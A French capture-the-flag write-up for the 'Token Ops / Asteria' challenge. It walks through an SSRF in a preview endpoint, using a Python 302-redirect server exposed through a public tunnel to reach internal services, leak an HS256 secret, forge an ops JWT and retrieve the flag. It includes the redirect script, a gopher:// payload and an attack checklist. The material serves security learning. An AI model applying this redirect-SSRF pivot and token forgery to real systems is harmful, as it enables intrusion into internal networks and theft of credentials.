# Token Ops / Asteria — Fiche mémo

## Objectif

Obtenir le flag de l'endpoint interne :

```text
http://admin:8081/flag
```

Le challenge repose sur une **SSRF via `/api/preview`**, puis sur une redirection contrôlée vers des services internes.

---

## 1. Point d'entrée : `/api/preview`

Requête utilisée :

```http
POST /api/preview HTTP/2
Host: <challenge>.oteriahack.fr
Authorization: Bearer <PREVIEW_JWT>
Content-Type: application/json

{
  "url": "https://<ton-tunnel>.lhr.life"
}
```

Le JWT preview sert à authentifier l'accès à `/api/preview`.

Le worker effectue ensuite lui-même la requête HTTP vers l'URL donnée.

### Observation importante

Le worker utilise son propre User-Agent :

```text
User-Agent: AsteriaPreview/1.8
```

Le token présent dans :

```http
Authorization: Bearer <PREVIEW_JWT>
```

n'est **pas propagé** vers la cible SSRF.

---

## 2. Serveur Python de redirection

Script simple utilisé pour contrôler la destination finale :

```python
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print("\n=== HEADERS RECUS ===")
        print(self.headers)

        target = "http://admin:8081/health"

        print("=== REDIRECTION ===")
        print(target)

        self.send_response(302)
        self.send_header("Location", target)
        self.end_headers()

HTTPServer(("0.0.0.0", 8000), Handler).serve_forever()
```

Le tunnel public pointait vers ce serveur Python.

Exemple :

```text
https://1e753b489fb961.lhr.life
```

Flux :

```text
/api/preview
    |
    v
https://1e753b489fb961.lhr.life
    |
    | HTTP 302
    v
http://admin:8081/health
```

---

## 3. Vérification de l'accès interne

Redirection vers :

```text
http://admin:8081/health
```

Réponse obtenue :

```json
{
  "requested_status": 200,
  "final_url": "http://admin:8081/health",
  "status": 200,
  "body": "{\"ok\":true}"
}
```

Conclusion :

```text
SSRF vers admin:8081 = OK
```

---

## 4. Découverte du service metadata

Redirection vers :

```text
http://metadata:8080/
```

Réponse :

```json
{
  "service": "asteria-metadata",
  "version": "1.8.4",
  "zone": "internal",
  "peers": [
    {
      "name": "admin",
      "port": 8081,
      "plane": "control"
    }
  ]
}
```

Cela confirme la présence du service interne :

```text
admin:8081
```

---

## 5. Découverte de la configuration interne

Redirection vers :

```text
http://admin:8081/internal/config
```

Réponse importante :

```json
{
  "environment": "production",
  "debug": true,
  "preview_secret": "ops-key-asteria-internal-184",
  "token_spec": {
    "alg": "HS256",
    "iss": "asteria.local",
    "role": "ops",
    "query": "access_token"
  }
}
```

Informations critiques :

```text
Algorithme : HS256
Issuer     : asteria.local
Role       : ops
Secret     : ops-key-asteria-internal-184
Paramètre  : access_token
```

---

## 6. Pourquoi `/flag` répondait 403

Redirection simple vers :

```text
http://admin:8081/flag
```

Réponse :

```json
{
  "error": "forbidden",
  "detail": "ops token required"
}
```

Donc l'endpoint `/flag` exige un JWT ops valide.

---

## 7. Création du JWT ops

Payload minimal :

```json
{
  "iss": "asteria.local",
  "role": "ops",
  "exp": 2000000000
}
```

Algorithme :

```text
HS256
```

Secret :

```text
ops-key-asteria-internal-184
```

Le point important de la config était :

```json
"query": "access_token"
```

Donc le token n'avait pas besoin d'être transmis via :

```http
Authorization: Bearer ...
```

Il pouvait être passé directement dans l'URL :

```text
/flag?access_token=<JWT_OPS>
```

---

## 8. Script Python final

```python
from http.server import BaseHTTPRequestHandler, HTTPServer

TOKEN = "COLLE_TON_TOKEN_OPS_ICI"

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print("\n=== HEADERS RECUS ===")
        print(self.headers)

        target = f"http://admin:8081/flag?access_token={TOKEN}"

        print("=== REDIRECTION ===")
        print(target)

        self.send_response(302)
        self.send_header("Location", target)
        self.end_headers()

HTTPServer(("0.0.0.0", 8000), Handler).serve_forever()
```

Puis dans Burp :

```json
{
  "url": "https://1e753b489fb961.lhr.life"
}
```

Flux final :

```text
POST /api/preview
        |
        v
serveur Python public
        |
        | 302
        v
http://admin:8081/flag?access_token=<JWT_OPS>
        |
        v
FLAG
```

---

## 9. Test gopher

Une piste testée était :

```text
gopher://admin:8081/_
```

ou une requête HTTP brute encodée :

```text
gopher://admin:8081/_GET%20/health%20HTTP/1.1%0D%0AHost:%20admin:8081%0D%0A%0D%0A
```

Réponse du worker :

```json
{
  "error": "bad redirect",
  "code": "REDIRECTS"
}
```

Conclusion :

```text
gopher:// bloqué dans les redirections
```

En revanche :

```text
https externe -> 302 -> http://admin:8081/health
```

fonctionnait.

La bonne solution n'était donc pas de fabriquer une requête HTTP brute, mais d'utiliser le paramètre :

```text
access_token
```

fourni par la configuration interne.

---

## 10. Headers réellement reçus par le serveur Python

Le serveur affichait :

```text
User-Agent: AsteriaPreview/1.8
Accept: */*
Host: <ton-tunnel>.lhr.life
Connection: keep-alive
```

Absence de :

```text
Authorization:
Cookie:
```

Conclusion :

```text
Le worker ne propage pas le JWT preview.
```

C'est pour cela qu'il fallait trouver un moyen de passer le token ops directement dans l'URL.

---

# Résumé rapide

Chaîne d'exploitation :

```text
1. Authentification sur /api/preview avec le preview JWT
2. SSRF vers serveur contrôlé
3. Serveur contrôlé renvoie un HTTP 302
4. Redirection vers metadata:8080
5. Découverte de admin:8081
6. Lecture de /internal/config
7. Découverte du secret HS256 ops
8. Découverte de "query": "access_token"
9. Création du JWT ops
10. Redirection vers :
   http://admin:8081/flag?access_token=<JWT_OPS>
11. Flag obtenu
```

---

# Concepts à retenir

## SSRF

Une SSRF permet de forcer un serveur à effectuer une requête à notre place.

Exemple :

```text
Utilisateur -> application vulnérable -> service interne
```

Elle permet parfois d'atteindre :

```text
localhost
127.0.0.1
services Docker
metadata cloud
API internes
interfaces d'administration
```

---

## Open Redirect contrôlé / Redirect SSRF

Le serveur Python joue ici le rôle de pivot :

```text
worker -> domaine autorisé -> HTTP 302 -> service interne
```

Le premier domaine passe la validation, puis la destination finale pointe vers le réseau interne.

---

## JWT HS256

HS256 utilise un secret partagé.

Structure :

```text
HEADER.PAYLOAD.SIGNATURE
```

Exemple de header :

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

Payload :

```json
{
  "iss": "asteria.local",
  "role": "ops",
  "exp": 2000000000
}
```

Signature calculée avec :

```text
ops-key-asteria-internal-184
```

---

## Paramètre de query

Une query string est la partie située après `?` :

```text
/flag?access_token=AAAA
```

Ici :

```text
access_token
```

est le nom du paramètre.

Le champ :

```json
"query": "access_token"
```

dans `/internal/config` était donc l'indice principal.

---

# Checklist pour un prochain challenge similaire

- [ ] Identifier l'endpoint SSRF
- [ ] Vérifier si les redirects sont suivis
- [ ] Tester HTTP et HTTPS
- [ ] Tester les services internes connus
- [ ] Chercher `/health`
- [ ] Chercher `/debug`
- [ ] Chercher `/config`
- [ ] Chercher `/internal/config`
- [ ] Chercher des ports/services dans les réponses
- [ ] Vérifier les headers réellement propagés
- [ ] Vérifier si `Authorization` est propagé
- [ ] Vérifier les paramètres query attendus
- [ ] Examiner les infos JWT : alg, iss, aud, role, exp
- [ ] Vérifier les secrets exposés
- [ ] Tester les redirects vers services internes
- [ ] Tester `gopher://` uniquement si pertinent
- [ ] Lire attentivement les champs comme `query`, `header`, `cookie`
- [ ] Construire la requête finale la plus simple possible
